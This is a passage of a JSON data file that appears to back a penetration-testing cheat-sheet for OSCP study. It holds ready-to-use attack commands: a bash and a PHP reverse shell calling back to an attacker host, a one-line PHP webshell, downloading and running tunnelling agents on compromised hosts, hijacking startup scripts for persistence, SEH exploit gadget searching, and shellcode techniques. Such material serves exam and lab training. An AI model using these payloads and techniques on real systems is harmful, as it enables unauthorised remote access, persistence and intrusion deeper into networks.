            "code": "<?php system(\"bash -c 'bash -i >& /dev/tcp/<AttackerIP>/<Port> 0>&1'\"); ?>"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "PHP Socket",
        "codes": [
          {
            "lang": "php",
            "code": "php -r '$sock=fsockopen(\"<AttackerIP>\",<Port>);exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Pentestmonkey PHP Shell",
        "codes": [
          {
            "lang": "bash",
            "code": "cp /usr/share/webshells/php/php-reverse-shell.php ."
          }
        ],
        "optional": false,
        "alternative": true,
        "remote": false,
        "local": false
      },
      {
        "title": "Simple PHP Webshell",
        "substeps": [
          {
            "title": "Use Webshell",
            "codes": [
              {
                "lang": "text",
                "code": "http://<Target>/shell.php?cmd=id"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "codes": [
          {
            "lang": "php",
            "code": "<?php system($_GET['cmd']); ?>"
          }
        ]
      }
    ],
    "resources": [],
    "foundational": true
  },
  {
    "category": "Pivoting with Ligolo-ng",
    "title": "Pivoting with Ligolo-ng",
    "tags": [
      "Lateral_Movement",
      "Ligolo",
      "Network",
      "Windows"
    ],
    "steps": [
      {
        "title": "Install on Kali",
        "codes": [
          {
            "lang": "bash",
            "code": "sudo apt install ligolo-ng"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": true
      },
      {
        "title": "Download from GitHub",
        "codes": [
          {
            "lang": "bash",
            "code": "wget https://github.com/Nicocha30/ligolo-ng/releases/latest/download/ligolo-ng_proxy_<Version>_linux_amd64.tar.gz\nwget https://github.com/Nicocha30/ligolo-ng/releases/latest/download/ligolo-ng_agent_<Version>_windows_amd64.zip"
          }
        ],
        "optional": false,
        "alternative": true,
        "remote": false,
        "local": false
      },
      {
        "title": "Automated Setup with LigoloSupport",
        "codes": [
          {
            "lang": "bash",
            "code": "curl -O https://raw.githubusercontent.com/Real-Fruit-Snacks/LigoloSupport/main/ligolo-helper.sh && chmod +x ligolo-helper.sh"
          },
          {
            "lang": "bash",
            "code": "sudo ./ligolo-helper.sh auto"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": true,
        "notes": [
          {
            "type": "note",
            "content": "One-command setup: downloads binaries, configures TUN interface, hosts file server on port 8000, and starts proxy.",
            "variant": "tip"
          }
        ]
      },
      {
        "title": "Individual LigoloSupport Commands",
        "codes": [
          {
            "lang": "bash",
            "code": "./ligolo-helper.sh download\n./ligolo-helper.sh setup-tun\n./ligolo-helper.sh proxy\n./ligolo-helper.sh add-route <Subnet>\n./ligolo-helper.sh agent-cmd\n./ligolo-helper.sh status"
          }
        ],
        "optional": false,
        "alternative": true,
        "remote": false,
        "local": false
      },
      {
        "title": "Manual Setup - Create TUN Interface",
        "codes": [
          {
            "lang": "bash",
            "code": "sudo ip tuntap add user $(whoami) mode tun ligolo"
          },
          {
            "lang": "bash",
            "code": "sudo ip link set ligolo up"
          }
        ],
        "optional": false,
        "alternative": true,
        "remote": false,
        "local": false
      },
      {
        "title": "Manual Setup - Start Proxy Server",
        "codes": [
          {
            "lang": "bash",
            "code": "./proxy -selfcert"
          },
          {
            "lang": "bash",
            "code": "./proxy -autocert"
          }
        ],
        "optional": false,
        "alternative": true,
        "remote": false,
        "local": false
      },
      {
        "title": "Transfer Agent to Target",
        "codes": [
          {
            "lang": "powershell",
            "code": "powershell wget http://<KaliIP>/agent.exe -o agent.exe"
          },
          {
            "lang": "bash",
            "code": "curl http://<KaliIP>/agent -o agent && chmod +x agent"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": true,
        "local": false
      },
      {
        "title": "Run Agent on Target",
        "codes": [
          {
            "lang": "bash",
            "code": "./agent -connect <KaliIP>:11601 -ignore-cert"
          },
          {
            "lang": "bash",
            "code": "./agent -connect <KaliIP>:11601 -ignore-cert -retry"
          },
          {
            "lang": "bash",
            "code": "./agent -connect <KaliIP>:11601 -accept-fingerprint <SHA256Fingerprint>"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": true,
        "local": false
      },
      {
        "title": "Select Session and Start Tunnel",
        "codes": [
          {
            "lang": "text",
            "code": "session"
          },
          {
            "lang": "text",
            "code": "start"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": true,
        "notes": [
          {
            "type": "note",
            "content": "Run these commands in the **Ligolo-ng** proxy console.",
            "variant": "info"
          }
        ]
      },
      {
        "title": "Add Route to Target Network",
        "codes": [
          {
            "lang": "bash",
            "code": "sudo ip route add <TargetSubnet>/24 dev ligolo"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": true
      },
      {
        "title": "Verify Tunnel Works",
        "codes": [
          {
            "lang": "bash",
            "code": "ping <InternalTargetIP>"
          },
          {
            "lang": "bash",
            "code": "nxc smb <TargetSubnet>/24"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": true
      },
      {
        "title": "Cleanup",
        "codes": [
          {
            "lang": "text",
            "code": "stop"
          },
          {
            "lang": "bash",
            "code": "sudo ip route del <TargetSubnet>/24 dev ligolo"
          },
          {
            "lang": "bash",
            "code": "sudo ip link set ligolo down\nsudo ip tuntap del mode tun ligolo"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": true
      },
      {
        "title": "Cleanup with LigoloSupport",
        "codes": [
          {
            "lang": "bash",
            "code": "./ligolo-helper.sh del-route <TargetSubnet>/24\n./ligolo-helper.sh teardown-tun"
          }
        ],
        "optional": false,
        "alternative": true,
        "remote": false,
        "local": false
      }
    ],
    "resources": [
      {
        "text": "Ligolo-ng GitHub",
        "url": "https://github.com/Nicocha30/ligolo-ng"
      },
      {
        "text": "Ligolo-ng Docs",
        "url": "https://docs.ligolo.ng/"
      },
      {
        "text": "LigoloSupport GitHub",
        "url": "https://github.com/Real-Fruit-Snacks/LigoloSupport"
      }
    ],
    "foundational": true,
    "notes": [
      {
        "type": "note",
        "content": "Creates tunnels using a TUN interface instead of SOCKS proxies. Run tools like **Nmap**, **Impacket**, and **NetExec** directly without proxychains. Agent requires no admin privileges.",
        "variant": "info"
      },
      {
        "type": "note",
        "content": "**Requirements:**\n- Root/admin on attack machine (to create TUN interface)\n- Agent binary transferred to compromised host\n- Network connectivity between agent and proxy (default port 11601)",
        "variant": "important"
      }
    ]
  },
  {
    "category": "OSCP Exam Strategy",
    "title": "Point Accumulation Strategy",
    "tags": [
      "Exam",
      "OSCP",
      "Workflow"
    ],
    "steps": [
      {
        "title": "Minimum to Pass: 70 Points",
        "codes": [],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "text",
            "content": "**Option 1: Three Standalone Machines + Bonus**\n- Machine 1 (user + root): 20 points\n- Machine 2 (user + root): 20 points\n- Machine 3 (user + root): 20 points\n- Bonus points (lab report): 10 points\n- **Total: 70 points (PASS)**"
          },
          {
            "type": "text",
            "content": "**Option 2: Two Standalone + AD Set + Bonus**\n- Machine 1 (user + root): 20 points\n- Machine 2 (user + root): 20 points\n- AD set (full compromise): 40 points\n- Bonus points: 10 points\n- **Total: 90 points**"
          },
          {
            "type": "text",
            "content": "**Option 3: AD Set + One Standalone + Bonus**\n- AD set (full compromise): 40 points\n- Machine 1 (user + root): 20 points\n- Bonus points: 10 points\n- **Total: 70 points (PASS)**"
          },
          {
            "type": "note",
            "content": "Bonus points can be the difference between pass and fail.",
            "variant": "tip"
          }
        ]
      }
    ],
    "resources": [],
    "foundational": true
  },
  {
    "category": "Linux Persistence",
    "title": "Poisoning Existing Scripts",
    "tags": [
      "Linux",
      "Persistence"
    ],
    "steps": [
      {
        "title": "Enumeration Strategy",
        "codes": [
          {
            "lang": "bash",
            "code": "# Check rc.local for existing scripts\ncat /etc/rc.local\n\n# List systemd services\nls -la /etc/systemd/system/\n\n# List init.d scripts\nls -la /etc/init.d/\n\n# List user crontabs\ncrontab -l\n\n# List system crontabs\ncat /etc/crontab\nls -la /etc/cron.d/\nls -la /etc/cron.daily/\nls -la /etc/cron.hourly/\nls -la /etc/cron.monthly/\nls -la /etc/cron.weekly/"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Enumerate all persistence methods discussed in this section looking for existing persistence that has been created via script files such as .sh, .py, etc. If those are modifiable, modify them to launch a malicious uploaded payload."
          }
        ]
      }
    ],
    "resources": [],
    "foundational": true,
    "notes": [
      {
        "type": "note",
        "content": "Hijack existing persistence mechanisms."
      }
    ]
  },
  {
    "category": "POP POP RET",
    "title": "POP POP RET Gadgets",
    "tags": [
      "Binary_Exploitation",
      "Debugging",
      "Exploitation",
      "SEH_Overflow",
      "WinDbg",
      "Windows"
    ],
    "steps": [
      {
        "title": "P/P/R Concept [Knowledge]",
        "codes": [
          {
            "lang": "text",
            "code": "Before P/P/R:        After POP:         After POP:         After RET:\nESP -> [Value1]      ESP -> [Value2]    ESP -> [nSEH addr] EIP -> nSEH code\n       [Value2]             [nSEH addr]        [...]\n       [nSEH addr]          [...]"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "The gadget removes two values from stack, then returns to address at ESP (our nSEH)."
          }
        ]
      },
      {
        "title": "Find P/P/R with Mona",
        "codes": [
          {
            "lang": "text",
            "code": "!mona seh                              ; Find all P/P/R\n!mona seh -m <Module>                  ; Search specific module\n!mona seh -cpb \"\\x00\\x0a\"              ; Exclude bad characters"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Search for POP/POP/RET sequences in Immunity Debugger."
          }
        ]
      },
      {
        "title": "Find P/P/R in WinDbg [Manual]",
        "codes": [
          {
            "lang": "text",
            "code": "; POP EAX (58); POP EAX (58); RET (C3)\ns -b <ModuleBase> L<Size> 58 58 c3\n\n; POP EBX (5B); POP EBX (5B); RET (C3)\ns -b <ModuleBase> L<Size> 5b 5b c3\n\n; POP ECX (59); POP EDX (5A); RET (C3)\ns -b <ModuleBase> L<Size> 59 5a c3"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Search for common P/P/R opcodes."
          }
        ]
      },
      {
        "title": "Common P/P/R Opcodes [Knowledge]",
        "codes": [
          {
            "lang": "text",
            "code": "POP EAX = 58        POP ESP = 5C (avoid)\nPOP ECX = 59        POP EBP = 5D\nPOP EDX = 5A        POP ESI = 5E\nPOP EBX = 5B        POP EDI = 5F\nRET     = C3"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "POP register opcodes to search for."
          }
        ]
      },
      {
        "title": "Comprehensive P/P/R Search",
        "codes": [
          {
            "lang": "text",
            "code": "; Search for any POP r32; POP r32; RET\ns -b <Base> L<Size> 58 58 c3    ; pop eax; pop eax; ret\ns -b <Base> L<Size> 58 59 c3    ; pop eax; pop ecx; ret\ns -b <Base> L<Size> 58 5a c3    ; pop eax; pop edx; ret\ns -b <Base> L<Size> 58 5b c3    ; pop eax; pop ebx; ret\n; ... continue for other combinations"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Search for multiple register combinations."
          }
        ]
      },
      {
        "title": "Verify P/P/R Gadget",
        "codes": [
          {
            "lang": "text",
            "code": "0:000> u <Address> L3\n10001234 58              pop     eax\n10001235 5b              pop     ebx\n10001236 c3              ret"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Confirm the instruction sequence."
          }
        ]
      },
      {
        "title": "P/P/R Requirements",
        "codes": [],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Gadget must meet certain criteria:\n1. Must be in executable memory\n2. Address must not contain bad characters\n3. Module should not have SafeSEH enabled\n4. Module should not have ASLR (or use non-ASLR module)",
            "variant": "important"
          }
        ]
      },
      {
        "title": "Check SafeSEH Status",
        "codes": [
          {
            "lang": "text",
            "code": "!mona modules"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Verify module does not use SafeSEH."
          }
        ],
        "postNotes": [
          {
            "type": "note",
            "content": "Look for \"SafeSEH: False\" in module listing."
          }
        ]
      },
      {
        "title": "Alternative Sequences",
        "codes": [
          {
            "lang": "text",
            "code": "POP; POP; RET           ; Standard\nPOP; POP; POP; RET      ; Works (extra POP doesn't matter)\nADD ESP, 8; RET         ; Equivalent effect"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Other instruction sequences that work."
          }
        ]
      },
      {
        "title": "Island Hopping [Knowledge]",
        "codes": [
          {
            "lang": "text",
            "code": "[Padding][nSEH: JMP SHORT][Handler: P/P/R][Small code][JMP to shellcode]"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "When shellcode space is limited, use short jumps to reach larger buffer."
          }
        ]
      },
      {
        "title": "Short Jump Encoding",
        "codes": [
          {
            "lang": "python",
            "code": "# JMP SHORT forward (positive offset)\njmp_forward = b\"\\xeb\\x06\"       # JMP +6 bytes\n\n# JMP SHORT backward (negative offset)\njmp_backward = b\"\\xeb\\xf0\"      # JMP -16 bytes (0xf0 = -16 signed)"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Encode short jumps for island hopping."
          }
        ]
      },
      {
        "title": "Calculate Backward Jump",
        "codes": [
          {
            "lang": "python",
            "code": "# To jump backward N bytes:\n# offset = 256 - N - 2 (subtract 2 for instruction length)\n# JMP -50 bytes:\noffset = 256 - 50 - 2  # = 204 = 0xCC\njmp = b\"\\xeb\\xcc\""
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "For negative jumps, use two's complement."
          }
        ]
      },
      {
        "title": "Long Jump via Register",
        "codes": [
          {
            "lang": "nasm",
            "code": "; If short jump isn't enough, use near jump\n; Place this in nSEH area:\nnop                     ; 90\nnop                     ; 90\njmp short $+8           ; eb 06 (skip over handler)\n\n; After handler:\njmp <RelativeOffset>    ; e9 XX XX XX XX (near jump)"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Use conditional jump for larger distances."
          }
        ]
      }
    ],
    "resources": [
      {
        "text": "Corelan SEH Tutorial",
        "url": "https://www.corelan.be/index.php/2009/07/25/writing-buffer-overflow-exploits-a-quick-and-basic-tutorial-part-3-seh/"
      }
    ],
    "advanced": true,
    "notes": [
      {
        "type": "note",
        "content": "Find and use POP/POP/RET instruction sequences for SEH exploitation."
      }
    ]
  },
  {
    "category": "Pivoting with Ligolo-ng",
    "title": "Port Forwarding",
    "tags": [
      "Lateral_Movement",
      "Ligolo",
      "Network",
      "Windows"
    ],
    "steps": [
      {
        "title": "Add Listener",
        "codes": [
          {
            "lang": "text",
            "code": "listener_add --addr 0.0.0.0:4444 --to 127.0.0.1:4444"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": true,
        "notes": [
          {
            "type": "note",
            "content": "Run in **Ligolo-ng** proxy console.",
            "variant": "info"
          }
        ]
      },
      {
        "title": "List Listeners",
        "codes": [
          {
            "lang": "text",
            "code": "listener_list"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": true
      },
      {
        "title": "Remove Listener",
        "codes": [
          {
            "lang": "text",
            "code": "listener_del --id <ListenerID>"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": true
      }
    ],
    "resources": [],
    "foundational": true,
    "notes": [
      {
        "type": "note",
        "content": "Forward ports from your attack machine through the tunnel to the target network. Useful for reverse shells.",
        "variant": "tip"
      }
    ]
  },
  {
    "category": "Port Forwarding",
    "title": "Port Forwarding",
    "tags": [
      "Windows"
    ],
    "steps": [
      {
        "title": "Chisel - Reverse SOCKS Proxy",
        "substeps": [
          {
            "title": "Start Chisel Server",
            "codes": [
              {
                "lang": "bash",
                "code": "./chisel server -p 8000 --reverse"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": true
          },
          {
            "title": "Connect as SOCKS Proxy",
            "codes": [
              {
                "lang": "powershell",
                "code": "(New-Object Net.WebClient).DownloadFile('http://<KaliIP>/all/chisel.exe','ch.exe')"
              },
              {
                "lang": "bash",
                "code": ".\\ch.exe client <KaliIP>:8000 R:socks"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": true,
            "local": false
          },
          {
            "title": "Use Proxy",
            "codes": [
              {
                "lang": "bash",
                "code": "# Add to /etc/proxychains4.conf\n# socks5 127.0.0.1 1080\n\nproxychains nmap -sT -Pn 127.0.0.1\nproxychains curl http://127.0.0.1:<Port>"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": true
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Full proxy access to internal network through the target.",
            "variant": "tip"
          }
        ]
      },
      {
        "title": "Chisel - Single Port Forward",
        "substeps": [
          {
            "title": "Start Chisel Server",
            "codes": [
              {
                "lang": "bash",
                "code": "./chisel server -p 8000 --reverse"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": true
          },
          {
            "title": "Forward Port",
            "codes": [
              {
                "lang": "bash",
                "code": ".\\ch.exe client <KaliIP>:8000 R:<KaliPort>:127.0.0.1:<TargetPort>"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": true,
            "local": false
          },
          {
            "title": "Access Forwarded Service",
            "codes": [
              {
                "lang": "bash",
                "code": "# Service now accessible at 127.0.0.1:<KaliPort>\ncurl http://127.0.0.1:<KaliPort>"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": true
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Forward one specific port to Kali.",
            "variant": "tip"
          }
        ]
      },
      {
        "title": "Plink - SSH Port Forward",
        "codes": [
          {
            "lang": "bash",
            "code": "plink.exe -l <KaliUser> -pw <Password> -R <KaliPort>:127.0.0.1:<TargetPort> <KaliIP>"
          }
        ],
        "optional": false,
        "alternative": true,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Use when SSH is available on Kali. Requires credentials.",
            "variant": "info"
          }
        ]
      },
      {
        "title": "Netsh - Windows Native",
        "codes": [
          {
            "lang": "bash",
            "code": "netsh interface portproxy add v4tov4 listenport=<ListenPort> listenaddress=0.0.0.0 connectport=<TargetPort> connectaddress=127.0.0.1\n\nnetsh interface portproxy show all\nnetsh interface portproxy delete v4tov4 listenport=<ListenPort> listenaddress=0.0.0.0"
          }
        ],
        "optional": false,
        "alternative": true,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "No tools needed, but requires admin privileges.",
            "variant": "important"
          }
        ]
      },
      {
        "title": "SSH Local Port Forward",
        "substeps": [
          {
            "title": "Background SSH Tunnel",
            "codes": [
              {
                "lang": "bash",
                "code": "ssh -fNL <LocalPort>:<TargetHost>:<TargetPort> <User>@<SSHServer>"
              }
            ],
            "optional": true,
            "alternative": false,
            "remote": false,
            "local": false
          }
        ],
        "optional": false,
        "alternative": true,
        "remote": false,
        "local": false,
        "codes": [
          {
            "lang": "bash",
            "code": "ssh -L <LocalPort>:<TargetHost>:<TargetPort> <User>@<SSHServer>"
          }
        ],
        "notes": [
          {
            "type": "note",
            "content": "Forward traffic from local port through SSH server to reach internal host. Then browse to `http://localhost:<LocalPort>`.",
            "variant": "tip"
          }
        ]
      },
      {
        "title": "SSH Remote Port Forward",
        "codes": [
          {
            "lang": "bash",
            "code": "ssh -R <RemotePort>:localhost:<LocalPort> <User>@<SSHServer>"
          }
        ],
        "optional": false,
        "alternative": true,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Expose local service through SSH server (reverse tunnel).",
            "variant": "tip"
          }
        ]
      },
      {
        "title": "SSH Dynamic Port Forward (SOCKS)",
        "substeps": [
          {
            "title": "Use with proxychains",
            "codes": [
              {
                "lang": "bash",
                "code": "proxychains nmap -sT -Pn <TargetIP>"
              }
            ],
            "optional": true,
            "alternative": false,
            "remote": false,
            "local": false,
            "notes": [
              {
                "type": "note",
                "content": "Add `socks5 127.0.0.1 <LocalPort>` to `/etc/proxychains4.conf`.",
                "variant": "info"
              }
            ]
          }
        ],
        "optional": false,
        "alternative": true,
        "remote": false,
        "local": false,
        "codes": [
          {
            "lang": "bash",
            "code": "ssh -D <LocalPort> <User>@<SSHServer>"
          }
        ],
        "notes": [
          {
            "type": "note",
            "content": "Create SOCKS proxy to route traffic through SSH server.",
            "variant": "tip"
          }
        ]
      },
      {
        "title": "Socat Port Forward",
        "codes": [
          {
            "lang": "bash",
            "code": "socat TCP-LISTEN:<LocalPort>,fork TCP:<Target>:<TargetPort>"
          }
        ],
        "optional": false,
        "alternative": true,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Simple TCP port forwarding. Useful for quick redirects.",
            "variant": "tip"
          }
        ]
      }
    ],
    "resources": [
      {
        "text": "Chisel",
        "url": "https://github.com/jpillora/chisel"
      },
      {
        "text": "Plink",
        "url": "https://www.chiark.greenend.org.uk/~sgtatham/putty/latest.html"
      },
      {
        "text": "HackTricks - Tunneling",
        "url": "https://book.hacktricks.wiki/en/generic-methodologies-and-resources/tunneling-and-port-forwarding.html"
      }
    ],
    "foundational": true,
    "notes": [
      {
        "type": "note",
        "content": "Forward internal services (127.0.0.1) to your attack machine for exploitation.",
        "variant": "info"
      }
    ]
  },
  {
    "category": "Port Scanning with Nmap",
    "title": "Port Scanning",
    "tags": [
      "Discovery",
      "Network",
      "Nmap",
      "Reconnaissance"
    ],
    "steps": [
      {
        "title": "Basic Scans",
        "substeps": [
          {
            "title": "Default Scan (Top 1000 Ports)",
            "codes": [
              {
                "lang": "bash",
                "code": "nmap <Target>"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          },
          {
            "title": "Skip Host Discovery",
            "codes": [
              {
                "lang": "bash",
                "code": "nmap -Pn <Target>"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          },
          {
            "title": "Scan All Ports",
            "codes": [
              {
                "lang": "bash",
                "code": "nmap -p- <Target>"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          },
          {
            "title": "Scan Specific Ports",
            "codes": [
              {
                "lang": "bash",
                "code": "nmap -p <Port1>,<Port2>,<Port3> <Target>"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          },
          {
            "title": "Scan Port Range",
            "codes": [
              {
                "lang": "bash",
                "code": "nmap -p <StartPort>-<EndPort> <Target>"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Scan Types",
        "substeps": [
          {
            "title": "SYN/Stealth Scan (Default with Root)",
            "codes": [
              {
                "lang": "bash",
                "code": "sudo nmap -sS <Target>"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false,
            "notes": [
              {
                "type": "note",
                "content": "Sends SYN, receives SYN-ACK, never completes handshake. Faster and less likely to be logged.",
                "variant": "info"
              }
            ]
          },
          {
            "title": "TCP Connect Scan",
            "codes": [
              {
                "lang": "bash",
                "code": "nmap -sT <Target>"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false,
            "notes": [
              {
                "type": "note",
                "content": "Full TCP handshake. Works without root. Use when scanning through proxies.",
                "variant": "tip"
              }
            ]
          },
          {
            "title": "UDP Scan",
            "codes": [
              {
                "lang": "bash",
                "code": "sudo nmap -sU <Target>"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false,
            "notes": [
              {
                "type": "note",
                "content": "Slower and less reliable than TCP. Requires root.",
                "variant": "warning"
              }
            ]
          },
          {
            "title": "Combined TCP and UDP",
            "codes": [
              {
                "lang": "bash",
                "code": "sudo nmap -sS -sU <Target>"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Performance and Output",
        "substeps": [
          {
            "title": "Timing Templates",
            "codes": [
              {
                "lang": "bash",
                "code": "nmap -T4 <Target>"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false,
            "notes": [
              {
                "type": "note",
                "content": "Timing templates: **T0** (paranoid) to **T5** (insane). Default is **T3**."
              }
            ]
          },
          {
            "title": "Min Rate",
            "codes": [
              {
                "lang": "bash",
                "code": "nmap --min-rate 1000 <Target>"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          },
          {
            "title": "All Output Formats",
            "codes": [
              {
                "lang": "bash",
                "code": "nmap -oA output <Target>"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          },
          {
            "title": "Greppable Output",
            "codes": [
              {
                "lang": "bash",
                "code": "nmap -oG output.txt <Target>"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      }
    ],
    "resources": [
      {
        "text": "HackTricks - Pentesting Network",
        "url": "https://book.hacktricks.wiki/en/generic-methodologies-and-resources/pentesting-network/index.html"
      }
    ],
    "foundational": true,
    "notes": [
      {
        "type": "note",
        "content": "Default scan probes top 1000 TCP ports. Use **-Pn** to skip host discovery if target blocks ICMP.",
        "variant": "info"
      }
    ]
  },
  {
    "category": "Position-Independent Code",
    "title": "Position-Independent Shellcode",
    "tags": [
      "Binary_Exploitation",
      "Custom_Tools",
      "Debugging",
      "Exploitation",
      "ROP",
      "WinDbg",
      "Windows"
    ],
    "steps": [
      {
        "title": "Why Position Independence [Knowledge]",
        "codes": [],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Shellcode lands at unpredictable addresses during exploitation:\n- **ASLR**: Randomizes memory layout each execution\n- **Stack location**: Varies based on prior execution\n- **Heap allocation**: Address determined at runtime\n- Shellcode cannot hardcode any addresses",
            "variant": "important"
          }
        ]
      },
      {
        "title": "Delta Offset Technique",
        "codes": [
          {
            "lang": "nasm",
            "code": "; CALL pushes address of next instruction onto stack\ndelta:\n    call get_delta\nget_delta:\n    pop ebp                 ; EBP = address of get_delta\n    sub ebp, get_delta      ; EBP = delta (difference from assembled address)\n\n; Now use EBP as base for relative addressing\nlea eax, [ebp + some_data]  ; Calculates runtime address of some_data"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Determine shellcode's runtime address using **CALL/POP** pattern."
          }
        ]
      },
      {
        "title": "JMP/CALL/POP Pattern",
        "codes": [
          {
            "lang": "nasm",
            "code": "jmp short call_shellcode\nshellcode:\n    pop esi                 ; ESI = address of \"data\" below\n    ; ... use ESI-relative addressing ...\n\ncall_shellcode:\n    call shellcode\ndata:\n    db \"some string\", 0"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Common pattern for getting current address."
          }
        ]
      },
      {
        "title": "Avoiding NULL Bytes in MOV",
        "codes": [
          {
            "lang": "nasm",
            "code": "; BAD: Contains NULLs\nmov eax, 1              ; B8 01 00 00 00\n\n; GOOD: No NULLs\nxor eax, eax            ; 31 C0\ninc eax                 ; 40\n\n; For larger values:\npush 0x01020304         ; If value has no NULLs\npop eax\n\n; For values with embedded NULLs:\nmov eax, 0x01020305     ; Change problematic byte\ndec eax                 ; Adjust to get 0x01020304"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Replace NULL-producing MOV instructions:",
            "variant": "warning"
          }
        ]
      },
      {
        "title": "Encoding Strings Without NULLs",
        "codes": [
          {
            "lang": "nasm",
            "code": "; Technique 1: XOR decode\nencoded_string:\n    db \"dmc\", 0xFF          ; \"cmd\" XOR'd or modified\n; Decode at runtime\n\n; Technique 2: Build on stack (reversed, DWORD-aligned)\nxor eax, eax\npush eax                    ; NULL terminator\npush 0x6578652e             ; \".exe\"\npush 0x636c6163             ; \"calc\"\nmov esi, esp                ; ESI -> \"calc.exe\\0\"\n\n; Technique 3: Store with marker, replace at runtime\nstring_with_marker:\n    db \"cmd.exeX\"           ; X marks where NULL goes\n; Find X and replace with 0x00"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Store strings in shellcode without NULL terminators."
          }
        ]
      },
      {
        "title": "Stack-Based String Construction",
        "codes": [
          {
            "lang": "nasm",
